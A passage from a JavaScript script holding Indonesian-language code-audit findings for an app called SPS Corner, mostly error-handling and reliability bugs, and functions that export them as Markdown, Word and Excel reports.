      description: 'Polling interval tidak di-clear saat component unmount. State update dilakukan pada unmounted component.',
      impact: 'React warning. Memory leak. Potential crash.',
      ifFixed: 'Cleanup interval di useEffect return.',
      ifNotFixed: 'Memory leak. React warnings.',
    },
    {
      id: 's06',
      file: 'App.tsx:120-130',
      title: 'Reload loop pada chunk error',
      description: 'Jika JavaScript chunk load gagal, app reload. Tidak ada max retry. Bisa infinite loop.',
      impact: 'Browser hang. User harus force close.',
      ifFixed: 'Max retry limit. Graceful degradation.',
      ifNotFixed: 'Infinite reload. Browser unresponsive.',
    },
    {
      id: 's07',
      file: 'stock.ts:14',
      title: 'Insert error tidak di-handle',
      description: 'Insert ke `stock_requests` gagal tanpa error handling. Request hilang begitu saja.',
      impact: 'Restock request tidak tercatat. Admin tidak tahu ada request.',
      ifFixed: 'Error ditampilkan. User bisa retry.',
      ifNotFixed: 'Request hilang. Stok tidak pernah di-restock.',
    },
    {
      id: 's08',
      file: 'withdrawals.ts:62',
      title: 'Balance restore error tidak di-handle',
      description: 'Jika withdrawal gagal dan balance restore error, error tidak di-handle. Seller bisa rugi.',
      impact: 'Balance seller hilang tanpa trace. Manual fix diperlukan.',
      ifFixed: 'Error logged dan ditampilkan. Admin bisa intervensi.',
      ifNotFixed: 'Balance leak. Seller rugi.',
    },
    {
      id: 's09',
      file: 'payments.ts:92',
      title: 'API key missing → empty string',
      description: 'Jika `GROQ_API_KEY` tidak di-set, nilainya empty string. Groq calls gagal dengan error yang tidak jelas.',
      impact: 'AI features tidak berfungsi. Error message tidak membantu debugging.',
      ifFixed: 'Validasi API key saat startup. Error jelas.',
      ifNotFixed: 'Silent failure. Debugging sulit.',
    },
    {
      id: 's10',
      file: 'Multiple files',
      title: '@ts-nocheck disables type safety',
      description: 'Beberapa file menggunakan `// @ts-nocheck`. TypeScript tidak bisa mendeteksi type errors.',
      impact: 'Null checks terlewat. Type errors muncul di runtime.',
      ifFixed: 'Type safety aktif. Error terdeteksi saat compile.',
      ifNotFixed: 'Runtime errors yang seharusnya terdeteksi lebih awal.',
    },
  ],

  priority_fixes: [
    { priority: 1, items: ['C04', 'C05', 'C06', 'C01', 'C02', 'C03', 'C10', 'C13', 'C14', 'C08'], timeframe: 'Minggu Ini — CRITICAL' },
    { priority: 2, items: ['M01', 'M06', 'M07', 'M08', 'M11', 'M13', 'M14', 'M16', 'M17'], timeframe: '2 Minggu — MAJOR' },
    { priority: 3, items: ['Semua MINOR + SILENT'], timeframe: 'Bulan Depan — MINOR/SILENT' },
  ],
};

// ═══════════════════════════════════════════════════════════════
// MARKDOWN GENERATOR — FULL DETAIL
// ═══════════════════════════════════════════════════════════════

function generateMarkdown(data) {
  let md = `# System Audit Report — SPS Corner v${data.version}\n\n`;
  md += `**Tanggal:** ${data.date}  \n`;
  md += `**Scope:** ${data.scope}  \n`;
  md += `**Status:** ${data.summary.total} temuan ditemukan\n\n`;
  md += `---\n\n`;

  // Summary
  md += `## RINGKASAN\n\n`;
  md += `| Severity | Jumlah |\n|----------|--------|\n`;
  md += `| CRITICAL | ${data.summary.critical} |\n`;
  md += `| MAJOR | ${data.summary.major} |\n`;
  md += `| MINOR | ${data.summary.minor} |\n`;
  md += `| SILENT | ${data.summary.silent} |\n`;
  md += `| **Total** | **${data.summary.total}** |\n\n`;

  // CRITICAL — Full detail
  md += `---\n\n## 1. CRITICAL (${data.critical.length} temuan)\n\n`;
  md += `Temuan ini BISA mengakibatkan kerugian finansial, data breach, atau system compromise.\n\n`;
  for (const item of data.critical) {
    md += `### ${item.id}: ${item.title}\n\n`;
    md += `| | | \n|---|---|\n`;
    md += `| **File** | \`${item.file}\` |\n`;
    md += `| **Masalah** | ${item.description} |\n`;
    md += `| **Dampak** | ${item.impact} |\n`;
    md += `| **Jika Diperbaiki** | ${item.ifFixed} |\n`;
    md += `| **Jika TIDAK Diperbaiki** | ${item.ifNotFixed} |\n\n`;
  }

  // MAJOR — Full detail
  md += `---\n\n## 2. MAJOR (${data.major.length} temuan)\n\n`;
  md += `Temuan ini menyebabkan degradasi performa, UX buruk, atau risiko data inconsistency.\n\n`;
  for (const item of data.major) {
    md += `### ${item.id}: ${item.title}\n\n`;
    md += `| | | \n|---|---|\n`;
    md += `| **File** | \`${item.file}\` |\n`;
    md += `| **Masalah** | ${item.description} |\n`;
    md += `| **Dampak** | ${item.impact} |\n`;
    md += `| **Jika Diperbaiki** | ${item.ifFixed} |\n`;
    md += `| **Jika TIDAK Diperbaiki** | ${item.ifNotFixed} |\n\n`;
  }

  // MINOR — Table summary
  md += `---\n\n## 3. MINOR (${data.minor.length} temuan)\n\n`;
  md += `Temuan ini berdampak kecil namun mengurangi kualitas kode.\n\n`;
  md += `| ID | File | Masalah | Jika Diperbaiki | Jika Tidak |\n|----|------|---------|----------------|------------|\n`;
  for (const item of data.minor) {
    md += `| ${item.id} | \`${item.file}\` | ${item.title} | ${item.ifFixed} | ${item.ifNotFixed} |\n`;
  }
  md += `\n`;

  // SILENT — Table summary
  md += `---\n\n## 4. SILENT (${data.silent.length} temuan)\n\n`;
  md += `Temuan ini tidak menunjukkan error, tapi menyebabkan behavior yang tidak terduga.\n\n`;
  md += `| ID | File | Masalah | Dampak | Jika Diperbaiki | Jika Tidak |\n|----|------|---------|--------|----------------|------------|\n`;
  for (const item of data.silent) {
    md += `| ${item.id} | \`${item.file}\` | ${item.title} | ${item.impact} | ${item.ifFixed} | ${item.ifNotFixed} |\n`;
  }
  md += `\n`;

  // Priority
  md += `---\n\n## 5. PRIORITAS PERBAIKAN\n\n`;
  for (const p of data.priority_fixes) {
    md += `### Priority ${p.priority} — ${p.timeframe}\n`;
    md += `- ${p.items.join(', ')}\n\n`;
  }

  md += `---\n\n`;
  md += `*Audit ini dibuat pada ${data.date} oleh AI Agent (opencode). Setiap temuan harus diperbaiki sesuai prioritas.*\n`;

  return md;
}

// ═══════════════════════════════════════════════════════════════
// WORD GENERATOR — FULL DETAIL
// ═══════════════════════════════════════════════════════════════

function generateWord(data) {
  const headerStyle = { bold: true, size: 22, font: 'Calibri' };
  const cellStyle = { size: 18, font: 'Calibri' };
  const boldCell = { bold: true, size: 18, font: 'Calibri' };

  function makeRow(cells, isHeader = false) {
    return new TableRow({
      children: cells.map(cell => new TableCell({
        width: { size: 9000 / cells.length, type: WidthType.DXA },
        children: [new Paragraph({
          children: [new TextRun({ text: cell, ...(isHeader ? headerStyle : cellStyle) })],
        })],
      })),
    });
  }

  function makeKeyValueTable(pairs) {
    return new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      rows: pairs.map(([key, val]) => new TableRow({
        children: [
          new TableCell({
            width: { size: 2500, type: WidthType.DXA },
            children: [new Paragraph({ children: [new TextRun({ text: key, ...boldCell })] })],
          }),
          new TableCell({
            width: { size: 6500, type: WidthType.DXA },
            children: [new Paragraph({ children: [new TextRun({ text: val, ...cellStyle })] })],
          }),
        ],
      })),
    });
  }

  function makeTable(headers, rows) {
    return new Table({
      width: { size: 100, type: WidthType.PERCENTAGE },
      rows: [
        makeRow(headers, true),
        ...rows.map(row => makeRow(row)),
      ],
    });
  }

  function makeHeading(text, level = HeadingLevel.HEADING_2) {
    return new Paragraph({ text, heading: level, spacing: { before: 300, after: 150 } });
  }

  function makePara(text, bold = false) {
    return new Paragraph({ children: [new TextRun({ text, bold, size: 20, font: 'Calibri' })] });
  }

  function makeFinding(item) {
    return [
      makeHeading(`${item.id}: ${item.title}`, HeadingLevel.HEADING_3),
      makeKeyValueTable([
        ['File', item.file],
        ['Masalah', item.description],
        ['Dampak', item.impact],
        ['Jika Diperbaiki', item.ifFixed],
        ['Jika TIDAK Diperbaiki', item.ifNotFixed],
      ]),
      new Paragraph({ spacing: { after: 200 } }),
    ];
  }

  const children = [
    new Paragraph({
      children: [new TextRun({ text: `System Audit Report — v${data.version}`, bold: true, size: 32, font: 'Calibri' })],
      spacing: { after: 100 },
    }),
    makePara(`Tanggal: ${data.date}`),
    makePara(`Scope: ${data.scope}`),
    makePara(''),

    makeHeading('RINGKASAN'),
    makeTable(
      ['Severity', 'Jumlah', 'Penjelasan'],
      [
        ['CRITICAL', String(data.summary.critical), 'Bisa mengakibatkan kerugian finansial, data breach, atau system compromise'],
        ['MAJOR', String(data.summary.major), 'Degrades performa, UX buruk, atau risiko data inconsistency'],
        ['MINOR', String(data.summary.minor), 'Mengurangi kualitas kode, berdampak kecil'],
        ['SILENT', String(data.summary.silent), 'Tidak menunjukkan error, tapi behavior tidak terduga'],
        ['Total', String(data.summary.total), ''],
      ]
    ),
    new Paragraph({ spacing: { after: 300 } }),

    makeHeading(`1. CRITICAL (${data.critical.length} temuan)`),
    makePara('Temuan ini BISA mengakibatkan kerugian finansial, data breach, atau system compromise.'),
    ...data.critical.flatMap(makeFinding),

    makeHeading(`2. MAJOR (${data.major.length} temuan)`),
    makePara('Temuan ini menyebabkan degradasi performa, UX buruk, atau risiko data inconsistency.'),
    ...data.major.flatMap(makeFinding),

    makeHeading(`3. MINOR (${data.minor.length} temuan)`),
    makePara('Temuan ini berdampak kecil namun mengurangi kualitas kode.'),
    ...data.minor.flatMap(makeFinding),

    makeHeading(`4. SILENT (${data.silent.length} temuan)`),
    makePara('Temuan ini tidak menunjukkan error, tapi menyebabkan behavior yang tidak terduga.'),
    ...data.silent.flatMap(makeFinding),

    makeHeading('5. PRIORITAS PERBAIKAN'),
    ...data.priority_fixes.flatMap(p => [
      makeHeading(`Priority ${p.priority} — ${p.timeframe}`, HeadingLevel.HEADING_3),
      makePara(p.items.join(', ')),
    ]),
  ];

  return new Document({
    sections: [{ children }],
    styles: { default: { document: { run: { font: 'Calibri', size: 20 } } } },
  });
}

// ═══════════════════════════════════════════════════════════════
// EXCEL GENERATOR — FULL DETAIL
// ═══════════════════════════════════════════════════════════════

function generateExcel(data) {
  const wb = XLSX.utils.book_new();

  // Sheet 1: Summary
  const summaryData = [
    ['System Audit Report', `v${data.version}`, data.date],
    [''],
    ['Severity', 'Jumlah', 'Penjelasan'],
    ['CRITICAL', data.summary.critical, 'Bisa mengakibatkan kerugian finansial, data breach, atau system compromise'],
    ['MAJOR', data.summary.major, 'Degrades performa, UX buruk, atau risiko data inconsistency'],
    ['MINOR', data.summary.minor, 'Mengurangi kualitas kode, berdampak kecil'],
    ['SILENT', data.summary.silent, 'Tidak menunjukkan error, tapi behavior tidak terduga'],
    ['Total', data.summary.total, ''],
  ];
  const wsSummary = XLSX.utils.aoa_to_sheet(summaryData);
  wsSummary['!cols'] = [{ wch: 20 }, { wch: 10 }, { wch: 70 }];
  XLSX.utils.book_append_sheet(wb, wsSummary, 'Summary');

  // Sheet 2: Critical
  const criticalData = [['ID', 'File', 'Masalah', 'Dampak', 'Jika Diperbaiki', 'Jika TIDAK Diperbaiki']];
  for (const item of data.critical) {
    criticalData.push([item.id, item.file, item.description, item.impact, item.ifFixed, item.ifNotFixed]);
  }
  const wsCritical = XLSX.utils.aoa_to_sheet(criticalData);
  wsCritical['!cols'] = [{ wch: 6 }, { wch: 35 }, { wch: 50 }, { wch: 50 }, { wch: 50 }, { wch: 50 }];
  XLSX.utils.book_append_sheet(wb, wsCritical, 'Critical');

  // Sheet 3: Major
  const majorData = [['ID', 'File', 'Masalah', 'Dampak', 'Jika Diperbaiki', 'Jika TIDAK Diperbaiki']];
  for (const item of data.major) {
    majorData.push([item.id, item.file, item.description, item.impact, item.ifFixed, item.ifNotFixed]);
  }
  const wsMajor = XLSX.utils.aoa_to_sheet(majorData);
  wsMajor['!cols'] = [{ wch: 6 }, { wch: 35 }, { wch: 50 }, { wch: 50 }, { wch: 50 }, { wch: 50 }];
  XLSX.utils.book_append_sheet(wb, wsMajor, 'Major');

  // Sheet 4: Minor
  const minorData = [['ID', 'File', 'Masalah', 'Jika Diperbaiki', 'Jika TIDAK Diperbaiki']];
  for (const item of data.minor) {
    minorData.push([item.id, item.file, item.description, item.ifFixed, item.ifNotFixed]);
  }
  const wsMinor = XLSX.utils.aoa_to_sheet(minorData);
  wsMinor['!cols'] = [{ wch: 6 }, { wch: 35 }, { wch: 50 }, { wch: 50 }, { wch: 50 }];
  XLSX.utils.book_append_sheet(wb, wsMinor, 'Minor');

  // Sheet 5: Silent
  const silentData = [['ID', 'File', 'Masalah', 'Dampak', 'Jika Diperbaiki', 'Jika TIDAK Diperbaiki']];
  for (const item of data.silent) {
    silentData.push([item.id, item.file, item.description, item.impact, item.ifFixed, item.ifNotFixed]);
  }
  const wsSilent = XLSX.utils.aoa_to_sheet(silentData);
  wsSilent['!cols'] = [{ wch: 6 }, { wch: 35 }, { wch: 50 }, { wch: 50 }, { wch: 50 }, { wch: 50 }];
  XLSX.utils.book_append_sheet(wb, wsSilent, 'Silent');

  // Sheet 6: Priority Fix
  const priorityData = [['Priority', 'Timeframe', 'Items']];
  for (const p of data.priority_fixes) {
    priorityData.push([String(p.priority), p.timeframe, p.items.join(', ')]);
  }
  const wsPriority = XLSX.utils.aoa_to_sheet(priorityData);
  wsPriority['!cols'] = [{ wch: 10 }, { wch: 35 }, { wch: 80 }];
  XLSX.utils.book_append_sheet(wb, wsPriority, 'Priority Fix');

  return wb;
}

// ═══════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════

async function main() {
  const outputDir = path.join(__dirname, '..', 'docs');
  if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });

  const baseName = `AUDIT-v${AUDIT_DATA.version}`;

  // 1. Markdown
  const mdContent = generateMarkdown(AUDIT_DATA);
  fs.writeFileSync(path.join(outputDir, `${baseName}.md`), mdContent);
  console.log(`✅ Generated: docs/${baseName}.md`);

  // 2. Word
  const doc = generateWord(AUDIT_DATA);
  const buffer = await Packer.toBuffer(doc);
  fs.writeFileSync(path.join(outputDir, `${baseName}.docx`), buffer);
  console.log(`✅ Generated: docs/${baseName}.docx`);

  // 3. Excel
  const wb = generateExcel(AUDIT_DATA);
  XLSX.writeFile(wb, path.join(outputDir, `${baseName}.xlsx`));
  console.log(`✅ Generated: docs/${baseName}.xlsx`);

  console.log(`\n📄 All 3 formats generated in docs/`);
}

main().catch(console.error);
